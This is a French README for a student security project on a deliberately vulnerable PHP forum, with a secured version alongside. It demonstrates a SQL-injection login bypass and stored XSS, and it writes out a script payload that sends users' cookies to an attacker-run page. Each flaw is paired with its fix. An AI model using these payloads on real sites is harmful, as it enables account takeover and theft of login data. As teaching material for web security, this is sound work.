# Projet-web-secu

Dans le cadre de ce projet, nous sommes partie d’un site web que j’ai développée en PHP sur laquelle j’ai exploré les possibles failles qu’elle pourrait contenir.

L’application est un forum de discussion informatique. qui offre la possibilité de s’authentifier, de soumettre des sujets et desmessages.

**Outils**: PHP, HTML, CSS, MySQL, PHPMYADMIN

## Mise en évidence d’une faille d’injection SQL

Pour contribuer au forum c’est-à-dire réponndre créer un sujet, ecrire un message, l’on a besoin de se connecter avec un pseudo et un mot de mot de passe. 
Ici nous verons que même un utilisateur qui n’a pas de compte peut se connecter fraduleusement et causer des degâts  avec de l’injection SQL dans la page de login.

Dans la page de connexion nous rentrons le pseudo d’un utilisateur existant toto par exemple et password qui n’est pas celle de l’utilisateur toto: " or ""="
et on vois que nous sommes connectés comme etabt l’utilisateur toto. Ce qui nous permet de créer des sujets en tant que utilisateur toto

*image*

## Solution

Dans la version sécurisé du site (http://localhost/myforumsecu) nous avons utliser les réquêtes préparées dans le code qui êrmet de se connecter (`loger.php`) pour palier ce problème.
l’ancienne ligne:
`$result =$id_con->query('SELECT * FROM users WHERE id_user="'.$pseudo.'" AND passwd="'.$pass.'" ') ;`
devient:

`$result = $id_con->prepare("SELECT * FROM users where id_user = :pseudo AND passwd = :pass");`
`$result -> execute(array('pseudo' => $pseudo, 'pass' => $pass));`

## Mise en évidence de la faille XSS

Dans la version non sécurisée du site (http://localhost/myforum) mettons dans le champs de commentaire le message `<u>hello attaquant</u>`

On constate que la mise en forme html est faite. On se retrouve donc avec hello attaquant. Le plus gros problème est que cette faille est persistante, car inscrite dans la base de données.

Ayant connaissance de cette faille, l'attaquant pourrait casser la structure du site. Comme nous le montrerons ici en injectant du code javascript faisant une redirection vers le site google.com.

`<script>document.location="https://www.google.com"</script>`

On constate qu’à chaque ouverture du sujet contenant le code injecté il y a une redirection automatique vers google.com. Ce qui est inquiétant c’est que cela reste permanent.

## Exploitation de la faille

Essayons d’exploiter cette faille pour voler des cookies qui dans un cas précis pourrait permettre à un attaquant de s'attribuer des rôles plus élevés que prévu.

Ici nous allons écrire un code PHP (https://github.com/ang67/Projet-web-secu/tree/main/siteAttaquant/index.php) permettant de récupérer les cookies des utilisateurs.
Ce code se trouve peut se trouver sur un autre serveur distant (celui de l’attaquant par exemple https://github.com/ang67/Projet-web-secu/tree/main/siteAttaquant ). Dans ce code on récupère les cookies, puis on les stocke et enfin, on redirige l’utilisateur vers l’accueil comme si rien ne s’était passé. Pour notre exemple le site a décidé de sauvegarder les mots de passe et login pour permettre de se souvenir de l’utilisateur lors d’une nouvelle connection.

Maintenant l’attainjectons un code javascript dans un message ou dans un sujet qui redirige vers le code PHP malveillant.

`<script>document.location="http://localhost/siteattaquant?cookie="+document.cookie;</script>`

*image*

Maintenant l’attaquant a réussi son coup et s’attend à recoter le buttin. Si un l’utilisateur se connect en accèptant que le site se souvienne de lui, ou pour d’autres cookies par exemple, l’attaquant récupère alors toutes ces données sensibles dans un repertoire (`C:\wamp64\www\siteAttaquant\stolen_data.txt`) lors de sa visite sur la page contenant le code injecté.

*image*
*image*
*image*

## Solution

 Dans la version sécurisée du site (http://localhost/myforumsecu) nous avons

  - protégé les cookies en ajoutant l'attribut ***HttpOnly***
  - utilisé la méthode ***htmlspecialchars*** avec le flag *ENT_IGNORE* pour remplacer tous les caractères HTML. (https://www.php.net/manual/fr/function.htmlspecialchars.php)



